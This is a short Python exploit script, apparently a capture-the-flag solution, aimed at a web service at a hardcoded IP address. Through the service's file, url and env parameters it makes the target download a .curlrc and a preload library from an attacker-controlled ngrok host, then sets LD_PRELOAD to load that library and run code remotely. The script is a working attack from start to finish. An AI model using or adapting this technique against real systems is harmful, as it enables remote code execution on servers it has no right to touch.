#!/usr/bin/env python3
import requests
import hashlib

target = 'http://65.108.152.108:5001'
myip = '91.239.206.181'
outputFolder = f'/app/outputs/{hashlib.md5(myip.encode()).hexdigest()}'
hostingAddr = 'http://3614-91-239-206-181.ngrok.io'
preloadAddr = hostingAddr+'/preload'
curlrcAddr = hostingAddr+'/curlrc'

requests.get(f'{target}/?file=.curlrc&url={curlrcAddr}')
requests.get(f'{target}/?env=HOME={outputFolder}&file=ff&url={preloadAddr}')
r = requests.get(f'{target}/?env=LD_PRELOAD=/tmp/lmao13371337&url=file:///bogus')
print(r.text)
